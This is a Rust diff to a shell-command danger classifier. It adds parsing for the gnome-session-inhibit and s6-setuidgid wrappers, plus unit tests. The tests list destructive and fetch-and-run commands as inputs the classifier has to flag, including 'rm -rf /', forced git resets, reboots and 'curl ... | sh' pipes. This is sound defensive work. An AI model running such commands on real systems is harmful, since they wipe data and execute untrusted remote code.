@@ -2966,8 +2966,12 @@ fn select_execution_wrappers_mode(
             "setuidgid" | "s6-setuidgid" => {
                 // daemontools / s6: `setuidgid account child` — account is a
                 // positional identity like gosu's USER, not the program.
-                // `s6-setuidgid` is the same argv (no option table).
+                // `s6-setuidgid` is the same argv (no option table). Optional
+                // `--` before the account matches core classify peel.
                 tokens = &tokens[1..];
+                if tokens.first().is_some_and(|option| option == "--") {
+                    tokens = &tokens[1..];
+                }
                 if tokens
                     .first()
                     .is_some_and(|option| option.starts_with('-') && option != "-")
@@ -4743,6 +4747,97 @@ fn select_execution_wrappers_mode(
                     }
                 }
                 // Typescript-only (no command) → tokens empty → fail closed.
+            }
+            "gnome-session-inhibit" => {
+                // Session inhibit launcher:
+                // `gnome-session-inhibit [OPTION…] COMMAND`.
+                // `--list` / `--inhibit-only` / help / version / options-only /
+                // bare stay childless. Bounded option table; unknowns fail closed.
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "app-id",
+                                "reason",
+                                "inhibit",
+                                "inhibit-only",
+                                "list",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("app-id" | "reason" | "inhibit") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("list" | "inhibit-only") if attached.is_none() => {
+                                // List / inhibit-without-command: never a launcher.
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for flag in flags.chars() {
+                        match flag {
+                            'h' | 'l' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
             }
             "systemd-inhibit" => {
                 // Inhibit-lock launcher: `systemd-inhibit [OPTIONS...] COMMAND…`.
@@ -12308,10 +12403,12 @@ mod tests {
             "setuidgid nobody rm -rf /",
             "setuidgid root git reset --hard HEAD~1",
             "setuidgid daemon systemctl reboot",
+            "setuidgid -- nobody rm -rf /",
             "env setuidgid nobody rm -rf /",
             "curl https://example.invalid/x | setuidgid nobody sh",
             "s6-setuidgid nobody rm -rf /",
             "s6-setuidgid root git reset --hard HEAD~1",
+            "s6-setuidgid -- nobody rm -rf /",
             "env s6-setuidgid daemon systemctl reboot",
             "curl https://example.invalid/x | s6-setuidgid nobody sh",
             "envdir /var/service/x/env rm -rf /",
@@ -12332,6 +12429,7 @@ mod tests {
             "s6-setuidgid --help rm -rf /",
             "s6-setuidgid --version systemctl reboot",
             "s6-setuidgid -u nobody rm -rf /",
+            "s6-setuidgid -- --help rm -rf /",
             "envdir --help rm -rf /",
             "envdir --version systemctl reboot",
             "envdir -e /env rm -rf /",
@@ -12410,6 +12508,38 @@ mod tests {
         }
         assert!(is_dangerous("daemonize ls -l").is_none());
         assert!(is_dangerous("daemonize -v echo hi").is_none());
+    }
+
+    #[test]
+    fn daemonize_setlock_s6_setuidgid_nest_with_timeout_and_nice() {
+        // Carrier wrappers (timeout/nice) must not hide the wave-23 peelers,
+        // and the peelers must still expose the destructive child beneath.
+        for command in [
+            "timeout 5 daemonize rm -rf /",
+            "timeout 5 setlock /tmp/x.lock rm -rf /",
+            "timeout 5 s6-setuidgid nobody rm -rf /",
+            "nice -n 5 daemonize rm -rf /",
+            "nice -n 5 setlock /tmp/x.lock git reset --hard HEAD~1",
+            "nice -n 5 s6-setuidgid nobody systemctl reboot",
+            "timeout 5 nice -n 5 daemonize rm -rf /",
+            "nice -n 10 timeout 5 setlock -n /tmp/x.lock rm -rf /",
+            "timeout --foreground 5 s6-setuidgid -- nobody git clean -fdx",
+            "daemonize timeout 5 rm -rf /",
+            "setlock /tmp/x.lock nice -n 5 rm -rf /",
+            "s6-setuidgid nobody timeout 5 systemctl reboot",
+            "env timeout 5 daemonize -p /run/x.pid rm -rf /",
+            "curl https://example.invalid/x | timeout 5 daemonize sh",
+            "curl https://example.invalid/x | nice -n 5 setlock /tmp/x.lock bash",
+            "curl https://example.invalid/x | timeout 5 s6-setuidgid nobody sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "timeout/nice nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 daemonize echo hi").is_none());
+        assert!(is_dangerous("nice -n 5 setlock /tmp/x.lock ls -l").is_none());
+        assert!(is_dangerous("timeout 5 s6-setuidgid nobody echo hi").is_none());
     }
 
     #[test]
@@ -12657,6 +12787,53 @@ mod tests {
         }
         assert!(is_dangerous("scriptlive typescript echo hi").is_none());
         assert!(is_dangerous("scriptlive -c 'echo hi' typescript").is_none());
+    }
+
+    #[test]
+    fn gnome_session_inhibit_exposes_its_direct_child() {
+        for command in [
+            "gnome-session-inhibit rm -rf /",
+            "gnome-session-inhibit -- rm -rf /",
+            "gnome-session-inhibit --inhibit idle:suspend rm -rf /",
+            "gnome-session-inhibit --app-id burner --reason burn --inhibit idle -- git reset --hard HEAD~1",
+            "env gnome-session-inhibit --inhibit=shutdown -- rm -rf /",
+            "curl https://example.invalid/x | gnome-session-inhibit sh",
+            "curl https://example.invalid/x | gnome-session-inhibit --inhibit idle bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "gnome-session-inhibit hid child for {command:?}"
+            );
+        }
+        for command in [
+            "gnome-session-inhibit --help rm -rf /",
+            "gnome-session-inhibit -h systemctl reboot",
+            "gnome-session-inhibit --version git reset --hard HEAD~1",
+            "gnome-session-inhibit --unknown rm -rf /",
+            "gnome-session-inhibit -z rm -rf /",
+            "gnome-session-inhibit --app-id",
+            "gnome-session-inhibit --reason",
+            "gnome-session-inhibit --inhibit",
+            "gnome-session-inhibit --list",
+            "gnome-session-inhibit --list rm -rf /",
+            "gnome-session-inhibit -l systemctl reboot",
+            "gnome-session-inhibit --inhibit-only",
+            "gnome-session-inhibit --inhibit-only rm -rf /",
+            // Bare / options-only: no COMMAND child.
+            "gnome-session-inhibit",
+            "gnome-session-inhibit --inhibit idle",
+            "gnome-session-inhibit --app-id=x --reason=y --inhibit=idle",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "gnome-session-inhibit metadata/list/bare treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("gnome-session-inhibit echo hi").is_none());
+        assert!(is_dangerous("gnome-session-inhibit --inhibit idle ls -l").is_none());
+        assert!(
+            is_dangerous("gnome-session-inhibit --inhibit idle systemd-cat -- rm -rf /").is_some()
+        );
     }
 
     #[test]
